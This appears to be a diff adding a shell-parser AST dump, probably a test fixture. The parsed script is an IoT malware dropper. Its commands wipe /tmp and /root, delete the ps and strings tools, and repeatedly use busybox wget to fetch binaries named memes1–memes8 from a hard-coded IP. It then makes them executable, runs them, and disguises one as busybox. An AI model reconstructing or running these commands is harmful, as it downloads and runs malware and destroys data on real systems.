@@ -1,0 +1,689 @@
+CommandNode(lineno=2, pos=(12, 19), parts=[
+  WordNode(lineno=2, pos=(12, 14), word='rm'),
+  WordNode(lineno=2, pos=(15, 17), word='-f'),
+  WordNode(lineno=2, pos=(18, 19), word='*'),
+])
+CommandNode(lineno=3, pos=(20, 41), parts=[
+  WordNode(lineno=3, pos=(20, 27), word='busybox'),
+  WordNode(lineno=3, pos=(28, 30), word='rm'),
+  WordNode(lineno=3, pos=(31, 34), word='-rf'),
+  WordNode(lineno=3, pos=(35, 41), word='/tmp/*'),
+])
+CommandNode(lineno=4, pos=(42, 64), parts=[
+  WordNode(lineno=4, pos=(42, 49), word='busybox'),
+  WordNode(lineno=4, pos=(50, 52), word='rm'),
+  WordNode(lineno=4, pos=(53, 56), word='-rf'),
+  WordNode(lineno=4, pos=(57, 64), word='/root/*'),
+])
+CommandNode(lineno=5, pos=(65, 96), parts=[
+  WordNode(lineno=5, pos=(65, 72), word='busybox'),
+  WordNode(lineno=5, pos=(73, 75), word='rm'),
+  WordNode(lineno=5, pos=(76, 79), word='-rf'),
+  WordNode(lineno=5, pos=(80, 96), word='/usr/bin/strings'),
+])
+CommandNode(lineno=6, pos=(97, 123), parts=[
+  WordNode(lineno=6, pos=(97, 104), word='busybox'),
+  WordNode(lineno=6, pos=(105, 107), word='rm'),
+  WordNode(lineno=6, pos=(108, 111), word='-rf'),
+  WordNode(lineno=6, pos=(112, 123), word='/usr/bin/ps'),
+])
+ListNode(lineno=7, pos=(124, 221), parts=[
+  CommandNode(lineno=7, pos=(124, 163), parts=[
+    WordNode(lineno=7, pos=(124, 131), word='busybox'),
+    WordNode(lineno=7, pos=(132, 136), word='wget'),
+    WordNode(lineno=7, pos=(137, 163), word='http://80.82.64.142/memes1'),
+  ]),
+  OperatorNode(lineno=7, op=';', pos=(163, 164)),
+  CommandNode(lineno=7, pos=(165, 188), parts=[
+    WordNode(lineno=7, pos=(165, 172), word='busybox'),
+    WordNode(lineno=7, pos=(173, 178), word='chmod'),
+    WordNode(lineno=7, pos=(179, 181), word='+x'),
+    WordNode(lineno=7, pos=(182, 188), word='memes1'),
+  ]),
+  OperatorNode(lineno=7, op=';', pos=(188, 189)),
+  CommandNode(lineno=7, pos=(190, 198), parts=[
+    WordNode(lineno=7, pos=(190, 198), word='./memes1'),
+  ]),
+  OperatorNode(lineno=7, op=';', pos=(198, 199)),
+  CommandNode(lineno=7, pos=(200, 221), parts=[
+    WordNode(lineno=7, pos=(200, 207), word='busybox'),
+    WordNode(lineno=7, pos=(208, 210), word='rm'),
+    WordNode(lineno=7, pos=(211, 213), word='-f'),
+    WordNode(lineno=7, pos=(214, 221), word='memes1*'),
+  ]),
+])
+CommandNode(lineno=8, pos=(222, 229), parts=[
+  WordNode(lineno=8, pos=(222, 224), word='rm'),
+  WordNode(lineno=8, pos=(225, 227), word='-f'),
+  WordNode(lineno=8, pos=(228, 229), word='*'),
+])
+ListNode(lineno=9, pos=(230, 327), parts=[
+  CommandNode(lineno=9, pos=(230, 269), parts=[
+    WordNode(lineno=9, pos=(230, 237), word='busybox'),
+    WordNode(lineno=9, pos=(238, 242), word='wget'),
+    WordNode(lineno=9, pos=(243, 269), word='http://80.82.64.142/memes2'),
+  ]),
+  OperatorNode(lineno=9, op=';', pos=(269, 270)),
+  CommandNode(lineno=9, pos=(271, 294), parts=[
+    WordNode(lineno=9, pos=(271, 278), word='busybox'),
+    WordNode(lineno=9, pos=(279, 284), word='chmod'),
+    WordNode(lineno=9, pos=(285, 287), word='+x'),
+    WordNode(lineno=9, pos=(288, 294), word='memes2'),
+  ]),
+  OperatorNode(lineno=9, op=';', pos=(294, 295)),
+  CommandNode(lineno=9, pos=(296, 304), parts=[
+    WordNode(lineno=9, pos=(296, 304), word='./memes2'),
+  ]),
+  OperatorNode(lineno=9, op=';', pos=(304, 305)),
+  CommandNode(lineno=9, pos=(306, 327), parts=[
+    WordNode(lineno=9, pos=(306, 313), word='busybox'),
+    WordNode(lineno=9, pos=(314, 316), word='rm'),
+    WordNode(lineno=9, pos=(317, 319), word='-f'),
+    WordNode(lineno=9, pos=(320, 327), word='memes2*'),
+  ]),
+])
+CommandNode(lineno=10, pos=(328, 335), parts=[
+  WordNode(lineno=10, pos=(328, 330), word='rm'),
+  WordNode(lineno=10, pos=(331, 333), word='-f'),
+  WordNode(lineno=10, pos=(334, 335), word='*'),
+])
+ListNode(lineno=11, pos=(336, 433), parts=[
+  CommandNode(lineno=11, pos=(336, 375), parts=[
+    WordNode(lineno=11, pos=(336, 343), word='busybox'),
+    WordNode(lineno=11, pos=(344, 348), word='wget'),
+    WordNode(lineno=11, pos=(349, 375), word='http://80.82.64.142/memes3'),
+  ]),
+  OperatorNode(lineno=11, op=';', pos=(375, 376)),
+  CommandNode(lineno=11, pos=(377, 400), parts=[
+    WordNode(lineno=11, pos=(377, 384), word='busybox'),
+    WordNode(lineno=11, pos=(385, 390), word='chmod'),
+    WordNode(lineno=11, pos=(391, 393), word='+x'),
+    WordNode(lineno=11, pos=(394, 400), word='memes3'),
+  ]),
+  OperatorNode(lineno=11, op=';', pos=(400, 401)),
+  CommandNode(lineno=11, pos=(402, 410), parts=[
+    WordNode(lineno=11, pos=(402, 410), word='./memes3'),
+  ]),
+  OperatorNode(lineno=11, op=';', pos=(410, 411)),
+  CommandNode(lineno=11, pos=(412, 433), parts=[
+    WordNode(lineno=11, pos=(412, 419), word='busybox'),
+    WordNode(lineno=11, pos=(420, 422), word='rm'),
+    WordNode(lineno=11, pos=(423, 425), word='-f'),
+    WordNode(lineno=11, pos=(426, 433), word='memes3*'),
+  ]),
+])
+CommandNode(lineno=12, pos=(434, 441), parts=[
+  WordNode(lineno=12, pos=(434, 436), word='rm'),
+  WordNode(lineno=12, pos=(437, 439), word='-f'),
+  WordNode(lineno=12, pos=(440, 441), word='*'),
+])
+ListNode(lineno=13, pos=(442, 539), parts=[
+  CommandNode(lineno=13, pos=(442, 481), parts=[
+    WordNode(lineno=13, pos=(442, 449), word='busybox'),
+    WordNode(lineno=13, pos=(450, 454), word='wget'),
+    WordNode(lineno=13, pos=(455, 481), word='http://80.82.64.142/memes4'),
+  ]),
+  OperatorNode(lineno=13, op=';', pos=(481, 482)),
+  CommandNode(lineno=13, pos=(483, 506), parts=[
+    WordNode(lineno=13, pos=(483, 490), word='busybox'),
+    WordNode(lineno=13, pos=(491, 496), word='chmod'),
+    WordNode(lineno=13, pos=(497, 499), word='+x'),
+    WordNode(lineno=13, pos=(500, 506), word='memes4'),
+  ]),
+  OperatorNode(lineno=13, op=';', pos=(506, 507)),
+  CommandNode(lineno=13, pos=(508, 516), parts=[
+    WordNode(lineno=13, pos=(508, 516), word='./memes4'),
+  ]),
+  OperatorNode(lineno=13, op=';', pos=(516, 517)),
+  CommandNode(lineno=13, pos=(518, 539), parts=[
+    WordNode(lineno=13, pos=(518, 525), word='busybox'),
+    WordNode(lineno=13, pos=(526, 528), word='rm'),
+    WordNode(lineno=13, pos=(529, 531), word='-f'),
+    WordNode(lineno=13, pos=(532, 539), word='memes4*'),
+  ]),
+])
+CommandNode(lineno=14, pos=(540, 547), parts=[
+  WordNode(lineno=14, pos=(540, 542), word='rm'),
+  WordNode(lineno=14, pos=(543, 545), word='-f'),
+  WordNode(lineno=14, pos=(546, 547), word='*'),
+])
+ListNode(lineno=15, pos=(548, 645), parts=[
+  CommandNode(lineno=15, pos=(548, 587), parts=[
+    WordNode(lineno=15, pos=(548, 555), word='busybox'),
+    WordNode(lineno=15, pos=(556, 560), word='wget'),
+    WordNode(lineno=15, pos=(561, 587), word='http://80.82.64.142/memes5'),
+  ]),
+  OperatorNode(lineno=15, op=';', pos=(587, 588)),
+  CommandNode(lineno=15, pos=(589, 612), parts=[
+    WordNode(lineno=15, pos=(589, 596), word='busybox'),
+    WordNode(lineno=15, pos=(597, 602), word='chmod'),
+    WordNode(lineno=15, pos=(603, 605), word='+x'),
+    WordNode(lineno=15, pos=(606, 612), word='memes5'),
+  ]),
+  OperatorNode(lineno=15, op=';', pos=(612, 613)),
+  CommandNode(lineno=15, pos=(614, 622), parts=[
+    WordNode(lineno=15, pos=(614, 622), word='./memes5'),
+  ]),
+  OperatorNode(lineno=15, op=';', pos=(622, 623)),
+  CommandNode(lineno=15, pos=(624, 645), parts=[
+    WordNode(lineno=15, pos=(624, 631), word='busybox'),
+    WordNode(lineno=15, pos=(632, 634), word='rm'),
+    WordNode(lineno=15, pos=(635, 637), word='-f'),
+    WordNode(lineno=15, pos=(638, 645), word='memes5*'),
+  ]),
+])
+CommandNode(lineno=16, pos=(646, 653), parts=[
+  WordNode(lineno=16, pos=(646, 648), word='rm'),
+  WordNode(lineno=16, pos=(649, 651), word='-f'),
+  WordNode(lineno=16, pos=(652, 653), word='*'),
+])
+ListNode(lineno=17, pos=(654, 751), parts=[
+  CommandNode(lineno=17, pos=(654, 693), parts=[
+    WordNode(lineno=17, pos=(654, 661), word='busybox'),
+    WordNode(lineno=17, pos=(662, 666), word='wget'),
+    WordNode(lineno=17, pos=(667, 693), word='http://80.82.64.142/memes6'),
+  ]),
+  OperatorNode(lineno=17, op=';', pos=(693, 694)),
+  CommandNode(lineno=17, pos=(695, 718), parts=[
+    WordNode(lineno=17, pos=(695, 702), word='busybox'),
+    WordNode(lineno=17, pos=(703, 708), word='chmod'),
+    WordNode(lineno=17, pos=(709, 711), word='+x'),
+    WordNode(lineno=17, pos=(712, 718), word='memes6'),
+  ]),
+  OperatorNode(lineno=17, op=';', pos=(718, 719)),
+  CommandNode(lineno=17, pos=(720, 728), parts=[
+    WordNode(lineno=17, pos=(720, 728), word='./memes6'),
+  ]),
+  OperatorNode(lineno=17, op=';', pos=(728, 729)),
+  CommandNode(lineno=17, pos=(730, 751), parts=[
+    WordNode(lineno=17, pos=(730, 737), word='busybox'),
+    WordNode(lineno=17, pos=(738, 740), word='rm'),
+    WordNode(lineno=17, pos=(741, 743), word='-f'),
+    WordNode(lineno=17, pos=(744, 751), word='memes6*'),
+  ]),
+])
+CommandNode(lineno=18, pos=(752, 759), parts=[
+  WordNode(lineno=18, pos=(752, 754), word='rm'),
+  WordNode(lineno=18, pos=(755, 757), word='-f'),
+  WordNode(lineno=18, pos=(758, 759), word='*'),
+])
+ListNode(lineno=19, pos=(760, 857), parts=[
+  CommandNode(lineno=19, pos=(760, 799), parts=[
+    WordNode(lineno=19, pos=(760, 767), word='busybox'),
+    WordNode(lineno=19, pos=(768, 772), word='wget'),
+    WordNode(lineno=19, pos=(773, 799), word='http://80.82.64.142/memes7'),
+  ]),
+  OperatorNode(lineno=19, op=';', pos=(799, 800)),
+  CommandNode(lineno=19, pos=(801, 824), parts=[
+    WordNode(lineno=19, pos=(801, 808), word='busybox'),
+    WordNode(lineno=19, pos=(809, 814), word='chmod'),
+    WordNode(lineno=19, pos=(815, 817), word='+x'),
+    WordNode(lineno=19, pos=(818, 824), word='memes7'),
+  ]),
+  OperatorNode(lineno=19, op=';', pos=(824, 825)),
+  CommandNode(lineno=19, pos=(826, 834), parts=[
+    WordNode(lineno=19, pos=(826, 834), word='./memes7'),
+  ]),
+  OperatorNode(lineno=19, op=';', pos=(834, 835)),
+  CommandNode(lineno=19, pos=(836, 857), parts=[
+    WordNode(lineno=19, pos=(836, 843), word='busybox'),
+    WordNode(lineno=19, pos=(844, 846), word='rm'),
+    WordNode(lineno=19, pos=(847, 849), word='-f'),
+    WordNode(lineno=19, pos=(850, 857), word='memes7*'),
+  ]),
+])
+CommandNode(lineno=20, pos=(858, 865), parts=[
+  WordNode(lineno=20, pos=(858, 860), word='rm'),
+  WordNode(lineno=20, pos=(861, 863), word='-f'),
+  WordNode(lineno=20, pos=(864, 865), word='*'),
+])
+ListNode(lineno=21, pos=(866, 963), parts=[
+  CommandNode(lineno=21, pos=(866, 905), parts=[
+    WordNode(lineno=21, pos=(866, 873), word='busybox'),
+    WordNode(lineno=21, pos=(874, 878), word='wget'),
+    WordNode(lineno=21, pos=(879, 905), word='http://80.82.64.142/memes8'),
+  ]),
+  OperatorNode(lineno=21, op=';', pos=(905, 906)),
+  CommandNode(lineno=21, pos=(907, 930), parts=[
+    WordNode(lineno=21, pos=(907, 914), word='busybox'),
+    WordNode(lineno=21, pos=(915, 920), word='chmod'),
+    WordNode(lineno=21, pos=(921, 923), word='+x'),
+    WordNode(lineno=21, pos=(924, 930), word='memes8'),
+  ]),
+  OperatorNode(lineno=21, op=';', pos=(930, 931)),
+  CommandNode(lineno=21, pos=(932, 940), parts=[
+    WordNode(lineno=21, pos=(932, 940), word='./memes8'),
+  ]),
+  OperatorNode(lineno=21, op=';', pos=(940, 941)),
+  CommandNode(lineno=21, pos=(942, 963), parts=[
+    WordNode(lineno=21, pos=(942, 949), word='busybox'),
+    WordNode(lineno=21, pos=(950, 952), word='rm'),
+    WordNode(lineno=21, pos=(953, 955), word='-f'),
+    WordNode(lineno=21, pos=(956, 963), word='memes8*'),
+  ]),
+])
+CommandNode(lineno=23, pos=(965, 972), parts=[
+  WordNode(lineno=23, pos=(965, 967), word='rm'),
+  WordNode(lineno=23, pos=(968, 970), word='-f'),
+  WordNode(lineno=23, pos=(971, 972), word='*'),
+])
+ListNode(lineno=24, pos=(973, 1175), parts=[
+  CommandNode(lineno=24, pos=(973, 1012), parts=[
+    WordNode(lineno=24, pos=(973, 980), word='busybox'),
+    WordNode(lineno=24, pos=(981, 985), word='wget'),
+    WordNode(lineno=24, pos=(986, 1012), word='http://80.82.64.142/memes1'),
+  ]),
+  OperatorNode(lineno=24, op=';', pos=(1012, 1013)),
+  CommandNode(lineno=24, pos=(1014, 1040), parts=[
+    WordNode(lineno=24, pos=(1014, 1021), word='busybox'),
+    WordNode(lineno=24, pos=(1022, 1024), word='cp'),
+    WordNode(lineno=24, pos=(1025, 1037), word='/bin/busybox'),
+    WordNode(lineno=24, pos=(1038, 1040), word='./'),
+  ]),
+  OperatorNode(lineno=24, op=';', pos=(1040, 1041)),
+  CommandNode(lineno=24, pos=(1042, 1070), parts=[
+    WordNode(lineno=24, pos=(1042, 1049), word='busybox'),
+    WordNode(lineno=24, pos=(1050, 1053), word='cat'),
+    WordNode(lineno=24, pos=(1054, 1060), word='memes1'),
+    RedirectNode(lineno=24, output=
+      WordNode(lineno=24, pos=(1063, 1070), word='busybox'), pos=(1061, 1070), type='>'),
+  ]),
+  OperatorNode(lineno=24, op=';', pos=(1070, 1071)),
+  CommandNode(lineno=24, pos=(1072, 1092), parts=[
+    WordNode(lineno=24, pos=(1072, 1079), word='busybox'),
+    WordNode(lineno=24, pos=(1080, 1082), word='rm'),
+    WordNode(lineno=24, pos=(1083, 1085), word='-f'),
+    WordNode(lineno=24, pos=(1086, 1092), word='memes1'),
+  ]),
+  OperatorNode(lineno=24, op=';', pos=(1092, 1093)),
+  CommandNode(lineno=24, pos=(1094, 1119), parts=[
+    WordNode(lineno=24, pos=(1094, 1101), word='busybox'),
+    WordNode(lineno=24, pos=(1102, 1104), word='cp'),
+    WordNode(lineno=24, pos=(1105, 1112), word='busybox'),
+    WordNode(lineno=24, pos=(1113, 1119), word='memes1'),
+  ]),
+  OperatorNode(lineno=24, op=';', pos=(1119, 1120)),
+  CommandNode(lineno=24, pos=(1121, 1142), parts=[
+    WordNode(lineno=24, pos=(1121, 1128), word='busybox'),
+    WordNode(lineno=24, pos=(1129, 1131), word='rm'),
+    WordNode(lineno=24, pos=(1132, 1134), word='-f'),
+    WordNode(lineno=24, pos=(1135, 1142), word='busybox'),
+  ]),
+  OperatorNode(lineno=24, op=';', pos=(1142, 1143)),
+  CommandNode(lineno=24, pos=(1144, 1152), parts=[
+    WordNode(lineno=24, pos=(1144, 1152), word='./memes1'),
+  ]),
+  OperatorNode(lineno=24, op=';', pos=(1152, 1153)),
+  CommandNode(lineno=24, pos=(1154, 1175), parts=[
+    WordNode(lineno=24, pos=(1154, 1161), word='busybox'),
+    WordNode(lineno=24, pos=(1162, 1164), word='rm'),
+    WordNode(lineno=24, pos=(1165, 1167), word='-f'),
+    WordNode(lineno=24, pos=(1168, 1175), word='memes1*'),
+  ]),
+])
+CommandNode(lineno=25, pos=(1176, 1183), parts=[
+  WordNode(lineno=25, pos=(1176, 1178), word='rm'),
+  WordNode(lineno=25, pos=(1179, 1181), word='-f'),
+  WordNode(lineno=25, pos=(1182, 1183), word='*'),
+])
+ListNode(lineno=26, pos=(1184, 1386), parts=[
+  CommandNode(lineno=26, pos=(1184, 1223), parts=[
+    WordNode(lineno=26, pos=(1184, 1191), word='busybox'),
+    WordNode(lineno=26, pos=(1192, 1196), word='wget'),
+    WordNode(lineno=26, pos=(1197, 1223), word='http://80.82.64.142/memes2'),
+  ]),
+  OperatorNode(lineno=26, op=';', pos=(1223, 1224)),
+  CommandNode(lineno=26, pos=(1225, 1251), parts=[
+    WordNode(lineno=26, pos=(1225, 1232), word='busybox'),
+    WordNode(lineno=26, pos=(1233, 1235), word='cp'),
+    WordNode(lineno=26, pos=(1236, 1248), word='/bin/busybox'),
+    WordNode(lineno=26, pos=(1249, 1251), word='./'),
+  ]),
+  OperatorNode(lineno=26, op=';', pos=(1251, 1252)),
+  CommandNode(lineno=26, pos=(1253, 1281), parts=[
+    WordNode(lineno=26, pos=(1253, 1260), word='busybox'),
+    WordNode(lineno=26, pos=(1261, 1264), word='cat'),
+    WordNode(lineno=26, pos=(1265, 1271), word='memes2'),
+    RedirectNode(lineno=26, output=
+      WordNode(lineno=26, pos=(1274, 1281), word='busybox'), pos=(1272, 1281), type='>'),
+  ]),
+  OperatorNode(lineno=26, op=';', pos=(1281, 1282)),
+  CommandNode(lineno=26, pos=(1283, 1303), parts=[
+    WordNode(lineno=26, pos=(1283, 1290), word='busybox'),
+    WordNode(lineno=26, pos=(1291, 1293), word='rm'),
+    WordNode(lineno=26, pos=(1294, 1296), word='-f'),
+    WordNode(lineno=26, pos=(1297, 1303), word='memes2'),
+  ]),
+  OperatorNode(lineno=26, op=';', pos=(1303, 1304)),
+  CommandNode(lineno=26, pos=(1305, 1330), parts=[
+    WordNode(lineno=26, pos=(1305, 1312), word='busybox'),
+    WordNode(lineno=26, pos=(1313, 1315), word='cp'),
+    WordNode(lineno=26, pos=(1316, 1323), word='busybox'),
+    WordNode(lineno=26, pos=(1324, 1330), word='memes2'),
+  ]),
+  OperatorNode(lineno=26, op=';', pos=(1330, 1331)),
+  CommandNode(lineno=26, pos=(1332, 1353), parts=[
+    WordNode(lineno=26, pos=(1332, 1339), word='busybox'),
+    WordNode(lineno=26, pos=(1340, 1342), word='rm'),
+    WordNode(lineno=26, pos=(1343, 1345), word='-f'),
+    WordNode(lineno=26, pos=(1346, 1353), word='busybox'),
+  ]),
+  OperatorNode(lineno=26, op=';', pos=(1353, 1354)),
+  CommandNode(lineno=26, pos=(1355, 1363), parts=[
+    WordNode(lineno=26, pos=(1355, 1363), word='./memes2'),
+  ]),
+  OperatorNode(lineno=26, op=';', pos=(1363, 1364)),
+  CommandNode(lineno=26, pos=(1365, 1386), parts=[
+    WordNode(lineno=26, pos=(1365, 1372), word='busybox'),
+    WordNode(lineno=26, pos=(1373, 1375), word='rm'),
+    WordNode(lineno=26, pos=(1376, 1378), word='-f'),
+    WordNode(lineno=26, pos=(1379, 1386), word='memes2*'),
+  ]),
+])
+CommandNode(lineno=27, pos=(1387, 1394), parts=[
+  WordNode(lineno=27, pos=(1387, 1389), word='rm'),
+  WordNode(lineno=27, pos=(1390, 1392), word='-f'),
+  WordNode(lineno=27, pos=(1393, 1394), word='*'),
+])
+ListNode(lineno=28, pos=(1395, 1597), parts=[
+  CommandNode(lineno=28, pos=(1395, 1434), parts=[
+    WordNode(lineno=28, pos=(1395, 1402), word='busybox'),
+    WordNode(lineno=28, pos=(1403, 1407), word='wget'),
+    WordNode(lineno=28, pos=(1408, 1434), word='http://80.82.64.142/memes3'),
+  ]),
+  OperatorNode(lineno=28, op=';', pos=(1434, 1435)),
+  CommandNode(lineno=28, pos=(1436, 1462), parts=[
+    WordNode(lineno=28, pos=(1436, 1443), word='busybox'),
+    WordNode(lineno=28, pos=(1444, 1446), word='cp'),
+    WordNode(lineno=28, pos=(1447, 1459), word='/bin/busybox'),
+    WordNode(lineno=28, pos=(1460, 1462), word='./'),
+  ]),
+  OperatorNode(lineno=28, op=';', pos=(1462, 1463)),
+  CommandNode(lineno=28, pos=(1464, 1492), parts=[
+    WordNode(lineno=28, pos=(1464, 1471), word='busybox'),
+    WordNode(lineno=28, pos=(1472, 1475), word='cat'),
+    WordNode(lineno=28, pos=(1476, 1482), word='memes3'),
+    RedirectNode(lineno=28, output=
+      WordNode(lineno=28, pos=(1485, 1492), word='busybox'), pos=(1483, 1492), type='>'),
+  ]),
+  OperatorNode(lineno=28, op=';', pos=(1492, 1493)),
+  CommandNode(lineno=28, pos=(1494, 1514), parts=[
+    WordNode(lineno=28, pos=(1494, 1501), word='busybox'),
+    WordNode(lineno=28, pos=(1502, 1504), word='rm'),
+    WordNode(lineno=28, pos=(1505, 1507), word='-f'),
+    WordNode(lineno=28, pos=(1508, 1514), word='memes3'),
+  ]),
+  OperatorNode(lineno=28, op=';', pos=(1514, 1515)),
+  CommandNode(lineno=28, pos=(1516, 1541), parts=[
+    WordNode(lineno=28, pos=(1516, 1523), word='busybox'),
+    WordNode(lineno=28, pos=(1524, 1526), word='cp'),
+    WordNode(lineno=28, pos=(1527, 1534), word='busybox'),
+    WordNode(lineno=28, pos=(1535, 1541), word='memes3'),
+  ]),
+  OperatorNode(lineno=28, op=';', pos=(1541, 1542)),
+  CommandNode(lineno=28, pos=(1543, 1564), parts=[
+    WordNode(lineno=28, pos=(1543, 1550), word='busybox'),
+    WordNode(lineno=28, pos=(1551, 1553), word='rm'),
+    WordNode(lineno=28, pos=(1554, 1556), word='-f'),
+    WordNode(lineno=28, pos=(1557, 1564), word='busybox'),
+  ]),
+  OperatorNode(lineno=28, op=';', pos=(1564, 1565)),
+  CommandNode(lineno=28, pos=(1566, 1574), parts=[
+    WordNode(lineno=28, pos=(1566, 1574), word='./memes3'),
+  ]),
+  OperatorNode(lineno=28, op=';', pos=(1574, 1575)),
+  CommandNode(lineno=28, pos=(1576, 1597), parts=[
+    WordNode(lineno=28, pos=(1576, 1583), word='busybox'),
+    WordNode(lineno=28, pos=(1584, 1586), word='rm'),
+    WordNode(lineno=28, pos=(1587, 1589), word='-f'),
+    WordNode(lineno=28, pos=(1590, 1597), word='memes3*'),
+  ]),
+])
+CommandNode(lineno=29, pos=(1598, 1605), parts=[
+  WordNode(lineno=29, pos=(1598, 1600), word='rm'),
+  WordNode(lineno=29, pos=(1601, 1603), word='-f'),
+  WordNode(lineno=29, pos=(1604, 1605), word='*'),
+])
+ListNode(lineno=30, pos=(1606, 1808), parts=[
+  CommandNode(lineno=30, pos=(1606, 1645), parts=[
+    WordNode(lineno=30, pos=(1606, 1613), word='busybox'),
+    WordNode(lineno=30, pos=(1614, 1618), word='wget'),
+    WordNode(lineno=30, pos=(1619, 1645), word='http://80.82.64.142/memes4'),
+  ]),
+  OperatorNode(lineno=30, op=';', pos=(1645, 1646)),
+  CommandNode(lineno=30, pos=(1647, 1673), parts=[
+    WordNode(lineno=30, pos=(1647, 1654), word='busybox'),
+    WordNode(lineno=30, pos=(1655, 1657), word='cp'),
+    WordNode(lineno=30, pos=(1658, 1670), word='/bin/busybox'),
+    WordNode(lineno=30, pos=(1671, 1673), word='./'),
+  ]),
+  OperatorNode(lineno=30, op=';', pos=(1673, 1674)),
+  CommandNode(lineno=30, pos=(1675, 1703), parts=[
+    WordNode(lineno=30, pos=(1675, 1682), word='busybox'),
+    WordNode(lineno=30, pos=(1683, 1686), word='cat'),
+    WordNode(lineno=30, pos=(1687, 1693), word='memes4'),
+    RedirectNode(lineno=30, output=
+      WordNode(lineno=30, pos=(1696, 1703), word='busybox'), pos=(1694, 1703), type='>'),
+  ]),
+  OperatorNode(lineno=30, op=';', pos=(1703, 1704)),
+  CommandNode(lineno=30, pos=(1705, 1725), parts=[
+    WordNode(lineno=30, pos=(1705, 1712), word='busybox'),
+    WordNode(lineno=30, pos=(1713, 1715), word='rm'),
+    WordNode(lineno=30, pos=(1716, 1718), word='-f'),
+    WordNode(lineno=30, pos=(1719, 1725), word='memes4'),
+  ]),
+  OperatorNode(lineno=30, op=';', pos=(1725, 1726)),
+  CommandNode(lineno=30, pos=(1727, 1752), parts=[
+    WordNode(lineno=30, pos=(1727, 1734), word='busybox'),
+    WordNode(lineno=30, pos=(1735, 1737), word='cp'),
+    WordNode(lineno=30, pos=(1738, 1745), word='busybox'),
+    WordNode(lineno=30, pos=(1746, 1752), word='memes4'),
+  ]),
+  OperatorNode(lineno=30, op=';', pos=(1752, 1753)),
+  CommandNode(lineno=30, pos=(1754, 1775), parts=[
+    WordNode(lineno=30, pos=(1754, 1761), word='busybox'),
+    WordNode(lineno=30, pos=(1762, 1764), word='rm'),
+    WordNode(lineno=30, pos=(1765, 1767), word='-f'),
+    WordNode(lineno=30, pos=(1768, 1775), word='busybox'),
+  ]),
+  OperatorNode(lineno=30, op=';', pos=(1775, 1776)),
+  CommandNode(lineno=30, pos=(1777, 1785), parts=[
+    WordNode(lineno=30, pos=(1777, 1785), word='./memes4'),
+  ]),
+  OperatorNode(lineno=30, op=';', pos=(1785, 1786)),
+  CommandNode(lineno=30, pos=(1787, 1808), parts=[
+    WordNode(lineno=30, pos=(1787, 1794), word='busybox'),
+    WordNode(lineno=30, pos=(1795, 1797), word='rm'),
+    WordNode(lineno=30, pos=(1798, 1800), word='-f'),
+    WordNode(lineno=30, pos=(1801, 1808), word='memes4*'),
+  ]),
+])
+CommandNode(lineno=31, pos=(1809, 1816), parts=[
+  WordNode(lineno=31, pos=(1809, 1811), word='rm'),
+  WordNode(lineno=31, pos=(1812, 1814), word='-f'),
+  WordNode(lineno=31, pos=(1815, 1816), word='*'),
+])
+ListNode(lineno=32, pos=(1817, 2019), parts=[
+  CommandNode(lineno=32, pos=(1817, 1856), parts=[
+    WordNode(lineno=32, pos=(1817, 1824), word='busybox'),
+    WordNode(lineno=32, pos=(1825, 1829), word='wget'),
+    WordNode(lineno=32, pos=(1830, 1856), word='http://80.82.64.142/memes5'),
+  ]),
+  OperatorNode(lineno=32, op=';', pos=(1856, 1857)),
+  CommandNode(lineno=32, pos=(1858, 1884), parts=[
+    WordNode(lineno=32, pos=(1858, 1865), word='busybox'),
+    WordNode(lineno=32, pos=(1866, 1868), word='cp'),
+    WordNode(lineno=32, pos=(1869, 1881), word='/bin/busybox'),
+    WordNode(lineno=32, pos=(1882, 1884), word='./'),
+  ]),
+  OperatorNode(lineno=32, op=';', pos=(1884, 1885)),
+  CommandNode(lineno=32, pos=(1886, 1914), parts=[
+    WordNode(lineno=32, pos=(1886, 1893), word='busybox'),
+    WordNode(lineno=32, pos=(1894, 1897), word='cat'),
+    WordNode(lineno=32, pos=(1898, 1904), word='memes5'),
+    RedirectNode(lineno=32, output=
+      WordNode(lineno=32, pos=(1907, 1914), word='busybox'), pos=(1905, 1914), type='>'),
+  ]),
+  OperatorNode(lineno=32, op=';', pos=(1914, 1915)),
+  CommandNode(lineno=32, pos=(1916, 1936), parts=[
+    WordNode(lineno=32, pos=(1916, 1923), word='busybox'),
+    WordNode(lineno=32, pos=(1924, 1926), word='rm'),
+    WordNode(lineno=32, pos=(1927, 1929), word='-f'),
+    WordNode(lineno=32, pos=(1930, 1936), word='memes5'),
+  ]),
+  OperatorNode(lineno=32, op=';', pos=(1936, 1937)),
+  CommandNode(lineno=32, pos=(1938, 1963), parts=[
+    WordNode(lineno=32, pos=(1938, 1945), word='busybox'),
+    WordNode(lineno=32, pos=(1946, 1948), word='cp'),
+    WordNode(lineno=32, pos=(1949, 1956), word='busybox'),
+    WordNode(lineno=32, pos=(1957, 1963), word='memes5'),
+  ]),
+  OperatorNode(lineno=32, op=';', pos=(1963, 1964)),
+  CommandNode(lineno=32, pos=(1965, 1986), parts=[
+    WordNode(lineno=32, pos=(1965, 1972), word='busybox'),
+    WordNode(lineno=32, pos=(1973, 1975), word='rm'),
+    WordNode(lineno=32, pos=(1976, 1978), word='-f'),
+    WordNode(lineno=32, pos=(1979, 1986), word='busybox'),
+  ]),
+  OperatorNode(lineno=32, op=';', pos=(1986, 1987)),
+  CommandNode(lineno=32, pos=(1988, 1996), parts=[
+    WordNode(lineno=32, pos=(1988, 1996), word='./memes5'),
+  ]),
+  OperatorNode(lineno=32, op=';', pos=(1996, 1997)),
+  CommandNode(lineno=32, pos=(1998, 2019), parts=[
+    WordNode(lineno=32, pos=(1998, 2005), word='busybox'),
+    WordNode(lineno=32, pos=(2006, 2008), word='rm'),
+    WordNode(lineno=32, pos=(2009, 2011), word='-f'),
+    WordNode(lineno=32, pos=(2012, 2019), word='memes5*'),
+  ]),
+])
+CommandNode(lineno=33, pos=(2020, 2027), parts=[
+  WordNode(lineno=33, pos=(2020, 2022), word='rm'),
+  WordNode(lineno=33, pos=(2023, 2025), word='-f'),
+  WordNode(lineno=33, pos=(2026, 2027), word='*'),
+])
+ListNode(lineno=34, pos=(2028, 2230), parts=[
+  CommandNode(lineno=34, pos=(2028, 2067), parts=[
+    WordNode(lineno=34, pos=(2028, 2035), word='busybox'),
+    WordNode(lineno=34, pos=(2036, 2040), word='wget'),
+    WordNode(lineno=34, pos=(2041, 2067), word='http://80.82.64.142/memes6'),
+  ]),
+  OperatorNode(lineno=34, op=';', pos=(2067, 2068)),
+  CommandNode(lineno=34, pos=(2069, 2095), parts=[
+    WordNode(lineno=34, pos=(2069, 2076), word='busybox'),
+    WordNode(lineno=34, pos=(2077, 2079), word='cp'),
+    WordNode(lineno=34, pos=(2080, 2092), word='/bin/busybox'),
